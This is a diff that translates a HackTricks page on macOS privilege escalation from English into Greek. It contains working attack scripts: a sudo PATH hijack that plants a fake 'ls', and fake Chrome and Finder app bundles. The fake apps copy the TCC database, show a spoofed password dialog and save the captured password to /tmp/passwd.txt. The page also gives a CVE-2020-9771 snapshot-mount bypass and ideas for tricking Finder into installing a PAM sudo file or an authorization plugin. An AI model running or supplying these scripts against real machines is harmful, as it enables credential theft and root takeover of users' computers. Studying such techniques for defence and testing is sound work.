@@ -1,22 +1,22 @@
-# macOS Privilege Escalation
+# Επέκταση Προνομίων στο macOS
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
 
 </details>
 
-## TCC Privilege Escalation
+## Επέκταση Προνομίων TCC
 
-If you came here looking for TCC privilege escalation go to:
+Αν ήρθατε εδώ ψάχνοντας για επέκταση προνομίων TCC, πηγαίνετε στο:
 
 {% content-ref url="macos-security-protections/macos-tcc/" %}
 [macos-tcc](macos-security-protections/macos-tcc/)
@@ -24,26 +24,25 @@ If you came here looking for TCC privilege escalation go to:
 
 ## Linux Privesc
 
-Please note that **most of the tricks about privilege escalation affecting Linux/Unix will affect also MacOS** machines. So see:
+Παρακαλούμε σημειώστε ότι **η πλειοψηφία των κόλπων για επέκταση προνομίων που επηρεάζουν το Linux/Unix θα επηρεάσουν επίσης τις μηχανές MacOS**. Οπότε δείτε:
 
 {% content-ref url="../../linux-hardening/privilege-escalation/" %}
 [privilege-escalation](../../linux-hardening/privilege-escalation/)
 {% endcontent-ref %}
 
-## User Interaction
+## Αλληλεπίδραση Χρήστη
 
-### Sudo Hijacking
+### Απάτη του Sudo
 
-You can find the original [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/#sudo-hijacking).
+Μπορείτε να βρείτε την αρχική [τεχνική απάτης του Sudo μέσα στην ανάρτηση για την Επέκταση Προνομίων στο Linux](../../linux-hardening/privilege-escalation/#sudo-hijacking).
 
-However, macOS **maintains** the user's **`PATH`** when he executes **`sudo`**. Which means that another way to achieve this attack would be to **hijack other binaries** that the victim sill execute when **running sudo:**
-
+Ωστόσο, το macOS **διατηρεί** το **`PATH`** του χρήστη όταν εκτελεί το **`sudo`**. Αυτό σημαίνει ότι ένας άλλος τρόπος για να επιτευχθεί αυτή η επίθεση θα ήταν να **απατήσετε άλλα δυαδικά αρχεία** που ο θύμα θα εκτελέσει όταν **τρέχει το sudo:**
 ```bash
 # Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
 cat > /opt/homebrew/bin/ls <<EOF
 #!/bin/bash
 if [ "\$(id -u)" -eq 0 ]; then
-    whoami > /tmp/privesc
+whoami > /tmp/privesc
 fi
 /bin/ls "\$@"
 EOF
@@ -52,19 +51,17 @@ chmod +x /opt/homebrew/bin/ls
 # victim
 sudo ls
 ```
+Σημείωση ότι ένας χρήστης που χρησιμοποιεί το τερματικό θα έχει πιθανότατα εγκατεστημένο το **Homebrew**. Έτσι, είναι δυνατόν να καταληφθούν δυαδικά αρχεία στο **`/opt/homebrew/bin`**.
 
-Note that a user that uses the terminal will highly probable have **Homebrew installed**. So it's possible to hijack binaries in **`/opt/homebrew/bin`**.
+### Παραπλάνηση της Dock
 
-### Dock Impersonation
-
-Using some **social engineering** you could **impersonate for example Google Chrome** inside the dock and actually execute your own script:
+Χρησιμοποιώντας κάποιο **κοινωνικό μηχανικό** μπορείτε να **παραπλανήσετε για παράδειγμα το Google Chrome** μέσα στην dock και να εκτελέσετε πραγματικά το δικό σας script:
 
 {% tabs %}
-{% tab title="Chrome Impersonation" %}
-Some suggestions:
+{% tab title="Παραπλάνηση του Chrome" %}
+Ορισμένες προτάσεις:
 
-* Check in the Dock if there is a Chrome, and in that case **remove** that entry and **add** the **fake** **Chrome entry in the same position** in the Dock array.&#x20;
-
+* Ελέγξτε στην dock αν υπάρχει ένα Chrome και σε αυτήν την περίπτωση **αφαιρέστε** αυτήν την καταχώρηση και **προσθέστε** την **ψεύτικη** καταχώρηση του Chrome στην ίδια θέση στον πίνακα της dock.&#x20;
 ```bash
 #!/bin/sh
 
@@ -84,13 +81,13 @@ cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<EOF
 #include <unistd.h>
 
 int main() {
-    char *cmd = "open /Applications/Google\\\\ Chrome.app & "
-                "sleep 2; "
-                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
-                "PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
-                "echo \$PASSWORD > /tmp/passwd.txt";
-    system(cmd);
-    return 0;
+char *cmd = "open /Applications/Google\\\\ Chrome.app & "
+"sleep 2; "
+"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
+"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
+"echo \$PASSWORD > /tmp/passwd.txt";
+system(cmd);
+return 0;
 }
 EOF
 
@@ -106,22 +103,22 @@ cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    <key>CFBundleExecutable</key>
-    <string>Google Chrome</string>
-    <key>CFBundleIdentifier</key>
-    <string>com.google.Chrome</string>
-    <key>CFBundleName</key>
-    <string>Google Chrome</string>
-    <key>CFBundleVersion</key>
-    <string>1.0</string>
-    <key>CFBundleShortVersionString</key>
-    <string>1.0</string>
-    <key>CFBundleInfoDictionaryVersion</key>
-    <string>6.0</string>
-    <key>CFBundlePackageType</key>
-    <string>APPL</string>
-    <key>CFBundleIconFile</key>
-    <string>app</string>
+<key>CFBundleExecutable</key>
+<string>Google Chrome</string>
+<key>CFBundleIdentifier</key>
+<string>com.google.Chrome</string>
+<key>CFBundleName</key>
+<string>Google Chrome</string>
+<key>CFBundleVersion</key>
+<string>1.0</string>
+<key>CFBundleShortVersionString</key>
+<string>1.0</string>
+<key>CFBundleInfoDictionaryVersion</key>
+<string>6.0</string>
+<key>CFBundlePackageType</key>
+<string>APPL</string>
+<key>CFBundleIconFile</key>
+<string>app</string>
 </dict>
 </plist>
 EOF
@@ -136,15 +133,14 @@ killall Dock
 ```
 {% endtab %}
 
-{% tab title="Finder Impersonation" %}
-Some suggestions:
+{% tab title="Παραπλάνηση του Finder" %}
+Ορισμένες προτάσεις:
 
-* You **cannot remove Finder from the Dock**, so if you are going to add it to the Dock, you could put the fake Finder just next to the real one. For this you need to **add the fake Finder entry at the beginning of the Dock array**.
-* Another option is to not place it in the Dock and just open it, "Finder asking to control Finder" is not that weird.
-* Another options to **escalate to root without asking** the password with a horrible box, is make Finder really ask for the password to perform a privileged action:
-  * Ask Finder to copy to **`/etc/pam.d`** a new **`sudo`** file (The prompt asking for the password will indicate that "Finder wants to copy sudo")
-  * Ask Finder to copy a new **Authorization Plugin** (You could control the file name so the prompt asking for the password will indicate that "Finder wants to copy Finder.bundle")
-
+* Δεν μπορείτε να αφαιρέσετε τον Finder από τη γραμμή εργαλείων (Dock), επομένως αν πρόκειται να τον προσθέσετε, μπορείτε να τοποθετήσετε τον ψεύτικο Finder δίπλα στον πραγματικό. Για αυτό, χρειάζεται να προσθέσετε την καταχώρηση του ψεύτικου Finder στην αρχή του πίνακα της γραμμής εργαλείων (Dock array).
+* Μια άλλη επιλογή είναι να μην τοποθετήσετε τον Finder στη γραμμή εργαλείων (Dock) και απλά να τον ανοίξετε, η ερώτηση "Ο Finder ζητάει να ελέγξει τον Finder" δεν είναι και τόσο παράξενη.
+* Άλλες επιλογές για να αναβαθμίσετε σε root χωρίς να ζητήσετε τον κωδικό πρόσβασης με ένα απαίσιο παράθυρο, είναι να ζητήσετε πραγματικά από τον Finder να ζητήσει τον κωδικό πρόσβασης για να εκτελέσει μια προνομιούχα ενέργεια:
+* Ζητήστε από τον Finder να αντιγράψει ένα νέο αρχείο **`sudo`** στο **`/etc/pam.d`** (Η προτροπή που ζητάει τον κωδικό πρόσβασης θα υποδεικνύει ότι "Ο Finder θέλει να αντιγράψει το sudo")
+* Ζητήστε από τον Finder να αντιγράψει ένα νέο **Authorization Plugin** (Μπορείτε να ελέγξετε το όνομα του αρχείου, έτσι ώστε η προτροπή που ζητάει τον κωδικό πρόσβασης να υποδεικνύει ότι "Ο Finder θέλει να αντιγράψει το Finder.bundle")
 ```bash
 #!/bin/sh
 
@@ -164,13 +160,13 @@ cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<EOF
 #include <unistd.h>
 
 int main() {
-    char *cmd = "open /System/Library/CoreServices/Finder.app & "
-                "sleep 2; "
-                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
-                "PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
-                "echo \$PASSWORD > /tmp/passwd.txt";
-    system(cmd);
-    return 0;
+char *cmd = "open /System/Library/CoreServices/Finder.app & "
+"sleep 2; "
+"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
+"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
+"echo \$PASSWORD > /tmp/passwd.txt";
+system(cmd);
+return 0;
 }
 EOF
 
@@ -186,22 +182,22 @@ cat << EOF > /tmp/Finder.app/Contents/Info.plist
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    <key>CFBundleExecutable</key>
-    <string>Finder</string>
-    <key>CFBundleIdentifier</key>
-    <string>com.apple.finder</string>
-    <key>CFBundleName</key>
-    <string>Finder</string>
-    <key>CFBundleVersion</key>
-    <string>1.0</string>
-    <key>CFBundleShortVersionString</key>
-    <string>1.0</string>
-    <key>CFBundleInfoDictionaryVersion</key>
-    <string>6.0</string>
-    <key>CFBundlePackageType</key>
-    <string>APPL</string>
-    <key>CFBundleIconFile</key>
-    <string>app</string>
+<key>CFBundleExecutable</key>
+<string>Finder</string>
+<key>CFBundleIdentifier</key>
+<string>com.apple.finder</string>
+<key>CFBundleName</key>
+<string>Finder</string>
+<key>CFBundleVersion</key>
+<string>1.0</string>
+<key>CFBundleShortVersionString</key>
+<string>1.0</string>
+<key>CFBundleInfoDictionaryVersion</key>
+<string>6.0</string>
+<key>CFBundlePackageType</key>
+<string>APPL</string>
+<key>CFBundleIconFile</key>
+<string>app</string>
 </dict>
 </plist>
 EOF
@@ -217,12 +213,12 @@ killall Dock
 {% endtab %}
 {% endtabs %}
 
-## TCC - Root Privilege Escalation
+## TCC - Ανέβασμα Προνομίων σε Root
 
-### CVE-2020-9771 - mount\_apfs TCC bypass and privilege escalation
+### CVE-2020-9771 - παράκαμψη TCC και ανέβασμα προνομίων με την mount\_apfs
 
-**Any user** (even unprivileged ones) can create and mount a time machine snapshot an **access ALL the files** of that snapshot.\
-The **only privileged** needed is for the application used (like `Terminal`) to have **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`) which need to be granted by an admin.
+**Οποιοσδήποτε χρήστης** (ακόμα και μη προνομιούχος) μπορεί να δημιουργήσει και να ανεβάσει ένα αντίγραφο ασφαλείας του time machine και να **έχει πρόσβαση σε ΟΛΑ τα αρχεία** αυτού του αντιγράφου.\
+Το **μόνο προνόμιο** που χρειάζεται είναι για την εφαρμογή που χρησιμοποιείται (όπως το `Terminal`) να έχει **Πλήρη Πρόσβαση Δίσκου** (FDA) (`kTCCServiceSystemPolicyAllfiles`) το οποίο πρέπει να χορηγηθεί από έναν διαχειριστή. 
 
 {% code overflow="wrap" %}
 ```bash
@@ -246,11 +242,11 @@ ls /tmp/snap/Users/admin_user # This will work
 ```
 {% endcode %}
 
-A more detailed explanation can be [**found in the original report**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**
+Μια πιο λεπτομερής εξήγηση μπορεί να βρεθεί [**στην αρχική αναφορά**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**
 
-## Sensitive Information
+## Ευαίσθητες Πληροφορίες
 
-This can be useful to escalate privileges:
+Αυτό μπορεί να είναι χρήσιμο για την ανέλιξη προνομίων:
 
 {% content-ref url="macos-files-folders-and-binaries/macos-sensitive-locations.md" %}
 [macos-sensitive-locations.md](macos-files-folders-and-binaries/macos-sensitive-locations.md)
@@ -258,14 +254,14 @@ This can be useful to escalate privileges:
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
